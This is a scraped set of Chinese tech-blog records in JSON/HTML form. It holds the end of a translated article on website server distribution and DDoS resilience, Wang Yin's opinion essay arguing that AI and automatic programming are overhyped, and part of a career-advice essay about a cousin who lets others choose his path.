如今正在证明自己是一家更具安全意识的互联网公司。尽管他们并不是严格意义上的科技公司，但安全意识已经成为其经营策略中的核心一环。这涉及到可用性、解码、用户帐号及上传/获取等操作。P***Hub 似乎想保证其绝对安全，除了我在上文提到的bug有奖征集项目，他们还拥有一套多样化的 IP、服务器及供应商体系。</p>\n<figure id=\"attachment_2346\" class=\"wp-caption aligncenter\"><a href=\"https://i0.wp.com/advancedpersistentsecurity.net/wp-content/uploads/2016/11/Pornhub-Geo.png?ssl=1\"><img class=\"size-full wp-image-2346\" title=\"\" src=\"https://i0.wp.com/advancedpersistentsecurity.net/wp-content/uploads/2016/11/Pornhub-Geo.png?resize=788%2C504&amp;ssl=1\" alt=\"Pornhub.com Geolocation based on IP\" width=\"788\" height=\"504\"></a>\n<figcaption class=\"wp-caption-text\">P***Hub 基于 IP 的定位</figcaption>\n</figure>\n<p><strong>注意：亚特兰大的 pin 是错误的，这是我查询得到的地址而 UI 没有删除那个 pin。</strong></p>\n<p>和 Twitter 及 Facebook 一样，P***Hub 在曼尼托巴以及其他几个地方部署了服务器。尽管这种分布本身并不理想，但是有足够多的服务器（理论上）来提供必要的冗余。</p>\n<p>因此，我并未对这些网站做流量统计，但我可以预测出对以上这些网站上实施 DDoS 攻击的可能结果：</p>\n<p>1.Facebook 可能会因攻击者喜好而遭受攻击，从而使其社交功能瘫痪。</p>\n<p>2.Twitter 极有可能会得到和 Facebook 一样的下场。</p>\n<p>3.NSA 可能会因攻击者喜好而遭受攻击，但最有可能的情况是出于政治或黑客的原因。尤其是考虑到在该领域没有机密信息（理论上）。</p>\n<p>4.P***Hub 可能由于相似的原因而经历和 Facebook 及 Twitter 相同的命运，或是反色情道德运动的副产品。</p>\n<h3>有关业务持续性及灾后重建的思考</h3>\n<p>我上面提到的部分公司本质上是有弹性的，他们启动了业务持续性及故障恢复的有关计划，以保持业务在线以及盈利。因此，这是一个证明 BCP/DRP/CP/COOP 重要性的极端案例。</p>\n<p>总的来讲，我对这个话题有很多想法，但我把这些从供应链安全的角度整理成一篇单独的博文，就像从 BCP/DRP/CP/COOP 和弹性角度考虑一样。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://www.jobbole.com/wp-content/uploads/2016/04/85f924ce05b3b5a2e0e993aeb1ebae30.png\">\n            \n                            <img src=\"http://www.jobbole.com/wp-content/uploads/2016/04/71b393065ac2be7f16cd05554ead1678.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111025\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111025votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111025\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/sunshinebuel\">sunshinebuel</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/sunshinebuel\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/2016/04/64a1e6c29a08a2594164c1380a4bfcab.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            新世纪的好青年，写得了代码，下得了厨房，玩得了乐器，过得了六级！        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/sunshinebuel\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/sunshinebuel/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/sunshinebuel/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 12</a> · <a title=\"QQ：1156376002\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：zhifeijiang\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/05/Security-logo.jpg"], "fav_nums": 1, "comment_nums": 2, "create_date": "2017/04/27", "praise_nums": 1}
{"tags": " 2 评论 ,人工智能,IT技术", "front_image_path": "full/b37b71904c7c1fcf62a643220e0c50d92097b640.jpg", "title": "我为什么不在乎人工智能", "url_object_id": "53504a05afde3b12365a535ec907dce1", "url": "http://blog.jobbole.com/111027/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.yinwang.org/blog-cn/2017/04/23/ai\">王垠</a>   </div><p>有人听说我想创业，给我提出了一些“忽悠”的办法。他们说，既然你是程序语言专家，而现在人工智能（AI）又非常热，那你其实可以搞一个“自动编程系统”，号称可以自动生成程序，取代程序员的工作，节省许许多多的人力支出，这样就可以趁着“AI 热”拉到投资。</p>\n<p>有人甚至把名字都给我想好了，叫“深度程序员”（DeepCoder = Deep Learning + Coder）。口号是：“有了 DeepCoder，不用 Top Coder！” 还有人给我指出了这方向最新的，吹得神乎其神的研究，比如微软的 <a href=\"http://www.jiqizhixin.com/article/2691\">Robust Fill</a>……</p>\n<p>我谢谢这些人的关心，然而其实我并不在乎，也不看好人工智能。现在我简单的讲一下我的看法。</p>\n<h3>机器一样的心</h3>\n<p>很多人喜欢鼓吹人工智能，<a href=\"http://www.yinwang.org/blog-cn/2016/02/12/self-driving-car\">自动车</a>，机器人等技术，然而如果你仔细观察，就会发现这些人不但不理解人类智能是什么，不理解人工智能有什么局限性，而且这些“AI 狂人”们的心，已经严重的机械化了。他们或多或少的失去了人性，仿佛忘记了自己是一个人，忘记了人最需要的是什么，忘记了人的价值。这些人就像卓别林在『<a href=\"https://www.youtube.com/watch?v=w8HdOHrc3OQ\">大独裁者</a>』最后的演讲里指出的：“机器一样的人，机器一样的心。”</p>\n<p>每当提到 AI，这些人必然野心勃勃地号称要“取代人类的工作”，“节省劳动力开销”。暂且不讨论这些目标能否实现，它们与我的价值观，从一开头就是完全矛盾的。一个伟大的公司，应该为社会创造实在的，新的价值，而不是想方设法“节省”什么劳动力开销，让人失业！想一下都觉得可怕，我创造一个公司，它最大的贡献就是让成千上万的人失业，为贪得无厌的人节省“劳动力开销”，让贫富分化加剧，让权力集中到极少数人手里，最后导致民不聊生，导致社会的荒芜甚至崩溃……</p>\n<p>我不可想象生活在那样一个世界，就算那将使我成为世界上最有钱的人，也没有了意义。世界上有太多钱买不来的东西。如果走在大街上，我看不到人们幸福的笑容，悠闲的步伐，没有亲切的问候，关爱和幽默感，看不见甜蜜浪漫的爱情，反而看见遍地痛不欲生的无家可归者，鼻孔里钻进来他们留下的冲人的尿骚味，走到哪里都怕有人抢劫，因为人们实在活不下去了，除了偷和抢，没有别的办法活……</p>\n<p>如果人工智能成功的话，这也许就是最后的结果。幸运的是，有充足的证据显示，人工智能是永远不会成功的。</p>\n<h3>我的人工智能梦</h3>\n<p>很多人可能不知道，我也曾经是一个“AI 狂热者”。我也曾经为人工智能疯狂，把它作为自己的“伟大理想”。我也曾经张口闭口拿“人类”说事，仿佛机器是可以跟人类相提并论，甚至高于人类的。当深蓝电脑战胜卡斯帕罗夫，我也曾经感叹：“啊，我们人类完蛋了！” 我也曾经以为，有了“逻辑”和“学习”这两个法（kou）宝（hao），机器总有一天会超越人类的智能。可是我没有想清楚这具体要怎么实现，也没有想清楚实现了它到底有什么意义。</p>\n<p>故事要从十多年前讲起，那时候人工智能正处于它的冬天。在清华大学的图书馆，我偶然地发现了一本尘封已久的 Peter Norvig 的大作『<a href=\"http://norvig.com/paip.html\">Paradigms of Artificial Intelligence Programming</a>』（PAIP）。像个考古学家一样，我开始逐一地琢磨和实现其中的各种经典 AI 算法。PAIP 的算法侧重于逻辑和推理，因为在它的年代，很多 AI 研究者都以为人类的智能，归根结底就是逻辑推理。他们天真地以为，有了谓词逻辑，一阶逻辑这些东西，可以表达“因为所以不但而且存在所有”，机器就可以拥有智能。于是他们设计了各种基于逻辑的算法，专家系统（expert system），甚至设计了基于逻辑的程序语言 Prolog，把它叫做“第五代程序语言”。最后，他们遇到了无法逾越的障碍，众多的 AI 公司无法实现他们夸口的目标，各种基于“神经元”的机器无法解决实际的问题，巨额的政府和民间投资化为泡影，人工智能进入了冬天。</p>\n<p>我就是在那样一个冬天遇到了 PAIP，它虽然没能让我投身于人工智能领域，却让我迷上了 Lisp 和程序语言。也是因为这本书，我第一次轻松而有章法的实现了 A* 等算法，并且理解到里面的真谛。也是因为 PAIP，我第一次理解到了程序的“模块化”是什么，我开始在自己的程序里使用小的“工具函数”，而不再担心很多人忧心忡忡的“函数调用开销”。PAIP 和 SICP 这两本书，最后导致了我投身于程序语言领域，并且有幸获得这个领域鼻祖们的指点。</p>\n<p>在 PAIP 之后，我又迷了一阵子机器学习（machine learning），因为有人告诉我，机器学习是人工智能的新篇章。然而我逐渐的意识到，所谓的人工智能和机器学习，跟真正的人类智能，关系其实不大。相对于实际的问题，PAIP 里面的经典算法其实相当幼稚，复杂度很高，根本不可能解决大规模的实际问题。最重要的问题是，我看不出 PAIP 里面的算法跟“智能”有任何关系。而“机器学习”这个名字，完全就是一个幌子。很多人都看出来了，机器学习说白了就是统计学里面的“拟合函数”，换了一个具有迷惑性的名字而已。</p>\n<h3>吓人的外衣之下</h3>\n<p>人工智能的研究者们总是喜欢抬出“神经元”一类的名词来吓人，跟你说他们的算法是受了人脑神经元工作原理的启发。注意了，“<a href=\"http://www.yinwang.org/blog-cn/2013/04/12/inspiration\">启发</a>”是一个非常模棱两可的词，由一个东西启发得来的结果，可以跟这个东西毫不相干。比如我也可以说，Yin 语言的设计是受了九阴真经的启发 :P</p>\n<p>世界上这么多 AI 研究者，有几个真的研究过人脑，解刨过人脑，拿它做过实验，或者读过脑科学的研究成果？最后你发现，几乎没有 AI 研究者真正做过人脑或者认知科学的研究。著名的认知科学家 Douglas Hofstadter 早就在接受采访时指出，这帮所谓“AI 专家”，对人脑和意识（mind）是怎么工作的，其实完全不感兴趣，也从来没有深入研究过，却号称要实现“通用人工智能”（Artificial General Intelligence, AGI），这就是为什么 AI 直到今天都只是一个虚无的梦想。</p>\n<p>纵观历史上机器学习能够做到的事情，都是一些字符识别（OCR），语音识别，人脸识别一类的，我把这些统称为“识别系统”。当然，识别系统是很有价值的，我经常用手机上的语音输入法，人脸识别对于警察和间谍机关，显然意义重大。虽然很重要，识别系统跟真正的“智能”，却相去非常远，而且这些识别系统的普及，导致了人工智能的能力被严重的神化。说白了，这些识别系统，也就是统计学的拟合函数能做的事情：输出一堆像素或者音频，输出一个个的单词文本。很多人分不清“文字识别”和“语言理解”的区别。OCR 和语音识别系统，虽然能依靠统计的方法，知道你说的是哪些字，却不能真正理解你在说什么。</p>\n<p>聊一点深入的话题，看不懂的人可以跳过这一段。“识别”和“理解”的差别，就像程序语言里面“语法”和“语义”的差别。程序语言的文本，首先要经过词法分析器（lexer），语法分析器（parser），才能送进<a href=\"http://www.yinwang.org/blog-cn/2012/08/01/interpreter\">解释器</a>（interpreter），只有解释器才能实现程序的语义。类比一下，自然语言的语音识别系统，其实只相当于程序语言的词法分析器（lexer）。大部分的 AI 系统，连语法分析器（parser）都没有，所以主谓宾，句子结构都分析不清楚，更不要说理解其中的含义了。IBM 的语音识别专家 <a href=\"https://en.wikipedia.org/wiki/Frederick_Jelinek\">Frederick Jelinek</a> 曾经开玩笑说：“每当我开掉一个语言学家，识别率就上升了。” 其原因就是语音识别仅相当于一个 lexer，而语言学家研究的是 parser 以及 interpreter。当然了，你们干的事情太初级了，所以语言学家帮不了你们，但这并不等于语言学家是没有价值的。</p>\n<p>各大公司最近叫得最响亮的“AI 技术”，就是 Siri，Cortana，Google Assistant，Amazon Echo 一类含有语音识别功能的工具，叫做“个人助手”。这些东西里面，到底有多少可以叫做“智能”的东西，我想用过的人都应该明白。我每一次试用 Siri 都被它的愚蠢所折服，可以让你着急得砸了水果手机。那另外几个同类，也没有好到哪里去。很多人被“微软小冰”忽悠过，咋一看真能理解你说的话，然而聊一会你就发现，小冰不过是一个“网络句子搜索引擎”而已。它只是按照你句子里的关键字，随机搜出网上已有的句子。大部分这类句子出自问答类网站，比如百度知道，知乎，等等。一个很简单的实验，就是反复发送同一个词给小冰，比如“智能”，看它返回什么内容，然后拿这个内容到 Google 或者百度搜索，你就会找到那个句子真正的出处。人都喜欢自欺欺人，看到几个句子回答得挺有“诗意”，就以为它是在跟你对话，而其实它是牛头不对马嘴，所以你才感觉有“诗意”。大部分人跟小冰对话，都喜欢只把其中“符合逻辑”的部分截图下来，然后惊呼：“哇，小冰好有趣！” 他们没有告诉你的是，没贴出来的对话，几乎全都是鸡同鸭讲。</p>\n<p>我并不是说这些产品完全没有价值。我用过 Siri 和 Google Assistant，我发现它们还是有用的，特别是在开车的时候。因为开车时操作手机容易出事，所以我可以利用语音控制。比如我可以对手机说：“导航到最近的加油站。” 然而实现这种语音控制，根本不需要理解语言，你只需要用语音识别输入一个函数调用：导航（加油站）。个人助手在其它时候用处都不大。我不想在家里和公共场所使用它们，原因很简单：我懒得说话，或者不方便说话。点击几下屏幕，我就可以精确地做到我想要的事情，这比说话省力很多，也精确很多。个人助手完全不理解你在说什么，这种局限性本来无可厚非，然而各大公司却拿这些个人助手来煽风点火，各种夸大，闭口不提他们的局限性，让外行们以为人工智能就快实现了，这就是为什么我必须鄙视一下他们。</p>\n<p>由于有了这些“个人助手”，有些人就号称类似的技术可以用来制造“机器客服”，使用机器代替人作为客服。他们没有想清楚的是，客服看似“简单工作”，跟这些语音控制的玩意比起来，难度却是天壤之别。客服必须理解公司的业务，必须能够精确地理解客户在说什么，必须形成真正的对话，要能够为客户解决真正的问题，而不能只抓住一些关键字进行随机回复。另外，客服必须能够从对话信息，引发现实世界的改变，比如呼叫配送中心停止发货，向上级请求满足客户的特殊要求，拿出退货政策跟客户辩论，拒绝他们的退货要求，抓住客户心理，向他们推销新服务等等，各种需要“人类经验”才能处理的事情。所以机器能不但要能够形成真正的对话，理解客户的话，它们还需要现实世界的大量经验，需要改变现实世界的能力，才可能做客服的工作。由于这些个人助手全都是在忽悠，所以我看不到有任何希望，能够利用现有的技术实现机器客服。</p>\n<p>很多人看到 AlphaGo 的胜利，以为所谓 Deep Learning 终究有一天能够实现人类级别的智能。在之前的一篇<a href=\"http://www.yinwang.org/blog-cn/2016/03/09/alpha-go\">文章</a>里，我已经指出了这是一个误区。很多人以为人觉得困难的事情（比如围棋），就是体现真正人类智能的地方，其实不是那样的。我问你，心算除法（23423451345 / 729）难不难？这对于人是很难的，然而任何一个傻电脑，都可以在 0.1 秒之内把它算出来。围棋，国际象棋之类也是一样的原理。这些机械化的问题，根本不能反应真正的人类智能，它们只需要蛮力。</p>\n<p>纵观人工智能领域发明过的吓人术语，从 Artificial Intelligence 到 Artificial General Intelligence，从 Machine Learning 到 Deep Learning，…… 我总结出这样一个规律：人工智能的研究者们特别喜欢制造吓人的名词，当人们对一个名词失去信心，他们就会提出一个不大一样的，新的名词，免得人们把对这个名词的失望，转移到新的研究上面。然而这些名词之间，终究是换汤不换药。因为没有人真的知道人的智能是什么，所以也就没有办法实现“人工智能”。</p>\n<p>生活中的每一天，我这个“前 AI 狂热者”都在为“人类智能”显示出来的超凡能力而感到折服。甚至不需要是人，任何高等动物（比如猫）的能力，都让我感到敬畏。我发自内心的尊重人和动物。我不再有资格拿“人类”来说事，因为面对这个词汇，任何机器都是如此的渺小。</p>\n<h3>自动编程是不可能的</h3>\n<p>现在回到有些人最开头的提议，实现自动编程系统。我现在可以很简单的告诉你，那是不可能实现的。微软的 <a href=\"http://www.jiqizhixin.com/article/2691\">Robust Fill</a> 之类，全都是在扯淡。我对微软最近乘着 AI 热，各种煽风点火的做法，表示少许鄙视。不过微软的研究员也许知道这些东西的局限，只是国内小编在夸大它的功效吧。</p>\n<p>你仔细看看他们举出的例子，就知道那是一个玩具问题。人给出少量例子，想要电脑完全正确的猜出他想做什么，那显然是不可能的。很简单的原因，例子不可能包含足够的信息，精确地表达人想要什么。最最简单的变换也许可以，然而只要多出那么一点点例外情况，你就完全没法猜出来他想干什么。就连人看到这些例子，都不知道另一个人想干什么，机器又如何知道？这根本就是想实现“读心术”。甚至人自己都可以是糊涂的，他根本不知道自己想干什么，机器又怎么猜得出来？所以这比读心术还要难！</p>\n<p>对于如此弱智的问题，都不能 100% 正确的解决，遇到稍微有点逻辑的事情，就更没有希望了。论文最后还“高瞻远瞩”一下，提到要把这作法扩展到有“控制流”的情况，完全就是瞎扯。所以 RobustFill 所能做的，也就是让这种极其弱智的玩具问题，达到“接近 92% 的准确率”而已了。另外，这个 92% 是用什么标准算出来的，也很值得怀疑。</p>\n<p>任何一个负责的程序语言专家都会告诉你，自动生成程序是根本不可能的事情。因为“读心术”是不可能实现的，所以要机器做事，人必须至少告诉机器自己“想要什么”，然而表达这个“想要什么”的难度，其实跟编程几乎是一样的。实际上程序员工作的本质，不就是在告诉电脑自己想要它干什么吗？最困难的工作（数据结构，算法，数据库系统）已经被固化到了库代码里面，然而表达“想要干什么”这个任务，是永远无法自动完成的，因为只有程序员自己才知道他想要什么，甚至他自己都要想很久，才知道自己想要什么……</p>\n<p>有句话说得好：编程不过是一门失传的艺术的别名，这门艺术的名字叫做“思考”。没有任何机器可以代替人的思考，所以程序员是一种不可被机器取代的工作。虽然好的编程工具可以让程序员工作更加舒心和高效，任何试图取代程序员工作，节省编程劳力开销，克扣程序员待遇，试图把他们变成“可替换原件”的做法（比如 Agile，TDD），最终都会倒戈，使得雇主收到适得其反的后果。同样的原理也适用于其它的创造性工作：厨师，发型师，画家，……</p>\n<p>所以别妄想自动编程了。节省程序员开销唯一的办法，是邀请优秀的程序员，尊重他们，给他们好的待遇，让他们开心安逸的生活和工作。同时，开掉那些满口“Agile”，“Scrum”，“TDD”，“<a href=\"http://www.yinwang.org/blog-cn/2015/06/07/software-engineering\">软件工程</a>”，光说不做的扯淡管理者，他们才是真正浪费公司资源，降低开发效率和软件质量的祸根。</p>\n<h3>傻机器的价值</h3>\n<p>我不反对继续投资研究那些有实用价值的人工智能，然而我觉得不应该过度夸大它的用处，把注意力过分集中在它上面，仿佛那是唯一可以做的事情，仿佛那是一个划时代的革命，仿佛它将取代一切人类劳动。我的个人兴趣，其实不在人工智能上面。那我要怎么创业呢？很简单，我觉得大部分人其实不需要很“智能”的机器，“傻机器”才是对人最有价值的。所以设计新的，可靠的，造福于人的傻机器，应该是我创业的目标。当然我这里所谓的“机器”，包括了硬件和软件。</p>\n<p>只举一个例子，有些 AI 公司想研制“机器佣人”，可以自动打扫卫生做家务。我觉得这问题几乎不可能解决，还不如直接请真正智能的——阿姨来帮忙。我可以做一个阿姨服务平台，方便需要服务的家庭和阿姨进行配对。给阿姨配备更好的工具，通信，日程，支付设施，让她工作不累收钱又方便，让家庭也省心放心，那岂不是两全其美？哪里需要什么智能机器人，难度又高，又贵又不好用。显然这样的阿姨服务平台，结合真正的人的智能，轻而易举就可以让那些机器佣人公司死在萌芽之中。</p>\n<p>当然我不会真去做个阿姨服务平台，我只是举个例子。许许多多对人有用的傻机器，还在等着我们去发明。这些机器设计起来虽然需要灵机一动，然而实现起来难度却不高，给人带来便利，经济上见效也快。这些东西不对人的工作造成竞争，反而可能制造更多的就业机会，可以说是利国利民。利用人的智慧，加上机器的蛮力，让人们又省力又能挣钱，才是最合理的发展方向。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111027\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111027votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111027\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/12/e46742204dad572310cb643cb211c6e2.jpg"], "fav_nums": 1, "comment_nums": 2, "create_date": "2017/04/27", "praise_nums": 1}
{"tags": "改变,职场, 3 评论 ", "front_image_path": "full/cb13c8d9be10209394869622e63cd907d07946c9.jpg", "title": "这个时代会残酷惩罚不肯改变的人", "url_object_id": "b8e81391a76c429b00b25a6592424bc1", "url": "http://blog.jobbole.com/111017/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/yanyangtian/p/6765196.html\">燕洋天</a>   </div><p>花点时间，有点耐心，看完下面的这个故事！</p>\n<p>这是一个真实的故事……</p>\n<p>昨天晚上，接到妹妹的电话，说表弟的父母让表弟会家乡小镇去工作，因为他们安排好了；然后又说表弟“不听话，不想回去”，所以，想让我劝劝！</p>\n<p><strong> 在我看来：表弟的命运，一开始就已经固定了。</strong></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/04/98f2926e40d283131123fa2517a00d9e.png\" alt=\"\"></p>\n<p><strong>8</strong><strong>年前</strong>，表弟高考失利，按照我们家乡人一贯的想法（不考一本大学，丢人），他选择了复读。</p>\n<p><strong>7年前，</strong>表弟再次高考失利，在父母的不甘心下，让他再次复读了一次。（在我们家乡很常见，复读三次的都有，为了好大学）</p>\n<p><strong> 3年前，</strong>表弟大学毕业，找不到工作，因为选择的地质勘探方面，一个他不喜欢的专业，但是因为这个分数线低，可以保证进入重点大学。我告诉他，你大学的专业，可以不是你工作的方向，你可以自学。他说他如果放弃，四年就废了。</p>\n<p>我告诉他：你如果不重新选择，你以后几十年就废了。而且大学更重要培养自己的学习能力，而不仅仅只是那几本书的知识。</p>\n<p>今年，他研究生毕业了。他大学毕业的时候，考了一个和专业有点关联的研究生，认为：学历高了，会对工作有帮助。这是很多人考研的一个出发点！</p>\n<p><strong> 该面对的，早晚要面对，该来的，终究会来！</strong></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/04/a5341e1bc19dde705361020a6cc34045.png\" alt=\"\"></p>\n<p><strong>3</strong><strong>年前</strong>，我们经过深谈过很多次，我给他讲了很大。<strong>研究生三年时间，如果只是为了拿个学历，来减少找工作的恐惧感，建议还是不要靠；因为这三年的时间，在社会上面去打拼的收获会更大，直接面对现实。尤其是三年之后，年纪也大了，直接面对房子，婚嫁的问题，这个压力会比现在更大</strong>。</p>\n<p>他说他父母让他考研，我知道，这是事实，也是借口。我们家乡人喜欢面子“谁谁的小孩子是研究生啊，很不错”。</p>\n<p>去年快毕业了的时候，表弟再次找我，说找了很多单位实习，都不理想。因为他心气很高，唯一的底气就是：我是研究生。他说要去考博，我问了一句“考博之后呢？”。</p>\n<p>一直以来，我们总是活在别人的计划里面，遵守着一些不知道哪里来的“规律”：<strong>好成绩—好分数—好大学—好工作—好人生！</strong></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/04/bac530d42669391e05761e16390ae8f8.png\" alt=\"\"></p>\n<p>我们从小就是不断的被灌输这样的教导，这个逻辑，或许成立，但是没有必然的关系。</p>\n<p>最近表弟找过我，说要“取经”。其实该讲的，这些年都讲了。真的讲不出花来。因为他看起来很想改变，其实最后不会变。因为一直的性格，做事风格，已经决定了这一点。</p>\n<p>他埋怨！当然，他可以埋怨所有人的人，因为他是按照所有的意向在活。从选科，到选大学，选专业，到现在所有的选择，都是别人给他选择。他从来就没有按照自己的意愿来选择和生活。一方面是不知道如何选择，另外就是不敢选择。别人替他做主了，即便以后不成，还可以怪别人。这就是他心里不主动选择的想法。如果是自己选择了，万一错了，咋搞。算了，还是听他们的吧。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/04/0b7eb3acf863471bc1a0f3d2605c264c.png\" alt=\"\"></p>\n<p>好了，讲完故事，在聊聊我们现实的问题。</p>\n<p>很多的朋友一直抱怨，年纪越来越大了，发展已经到了瓶颈，无法突破，待遇也看到了天花板，而是还是一个很低的天花板。</p>\n<p>听完其实很清楚，即便给他们一个成为富翁的机会，他们也不会抓住。因为性格已经决定了这一点。</p>\n<p>我们常常讲一个段子：要是回到98年，遇到小马哥或者马云爸爸，跟他们混，或者投他们一点，现在绝对爽死了。</p>\n<p>如果当年真的他遇到了小马哥或者马云，他肯定不会理他们。我们羡慕的是他们现在的成就和地位。如果告诉你，有个公司，还不错，有可能是下一个BAT，但是待遇很低，风险很大，去不去。</p>\n<p><strong>想都不用想：肯定选择不去！</strong></p>\n<p>有时候，明明已经看到了自己的3-5年之后的样子，也知道那个样子绝对不是自己想要的样子，但是，就是不会行动，因为“现实还没有到来”，不是火烧眉毛，肯定不会主动改变。其实很多时候，现实会比我们预料的更快到来。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/04/c6df072d70b9a3333ba70774aade1b24.png\" alt=\"\"></p>\n<p>当然，我们可以扯很多的借口，“哎呀，兄弟，我有一家老小要养啊”，“我有很多房贷”，“今年要结婚啊，我要求稳”。</p>\n<p>一直在等“完美的时机”！</p>\n<p>很多的时机，都不是等出来的，而是在变化中碰出来的。</p>\n<p>越是穷的时候，越要动；越是没有机会的时候，要去外面跑。坐在家里，守着电脑，捧着手机，解决不了问题。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/04/edc30d333d24437d403db505ee1251b7.png\" alt=\"\"></p>\n<p>举个烧脑的例子，因为我认为这个例子最恰当：我们就好比一个原子，分子，我们的目标是不断的前进，去自己的理想地方。如果我们只是一个人，肯定很难完成，因为我们需要能量。我们就需要周围的原子，分子不断的撞击我们，从来改变我们的行动轨迹，在碰撞中给我们一点能量。我们和什么人碰撞，这是带有很大的不可预知性，但是，我们在每次的碰撞中，尽可能的按照目标去前进，这个道路不可能是笔直的。我们也不可能完全依靠自己达到目标，所以，我们要不断的、尽可能多的产生有效碰撞，一点点的前进。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/04/56ef3c0cf1cec454dfb92b60f3abadea.png\" alt=\"\"></p>\n<p>看到没，都原子弹了 ：）</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/04/095b47557aac4f25dd5c4f085e9ed5ee.png\" alt=\"\"></p>\n<p>所以，很多人喜欢采访成功者，总是问“你认为你成功的最大因素是什么？”，很多回答“运气”。这或许就是“真实的感受”。勤奋，努力，冷静，这都是成功的一个因素，但是不是导致成功的绝对因素，就好比之前我们说的“好分数—好人生”一样。很多时候都要不断的选择，变化，因时制宜。</p>\n<p><strong>我们一直在苦苦的摸索着一个“不变的定律”，从而来帮助自己达到想要的目标。但是这个世界从来都是变化的。可以回想我们知道，还有多人真正的信奉“好分数—好大学—好人生”的定律。</strong></p>\n<p>常常听很多人一直抱怨工作不爽，说要出去，信誓旦旦的样子。其实几年之后，他们还是在那里。即便公司明天快要倒闭了，很多人可能还在奢望等着赔偿，即便在此之前，公司已经很长时间发布出来工资。</p>\n<p>这里心理非常能理解：做熟不做生。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/04/9d223263e13d30d5ebf6053f1a0b918f.png\" 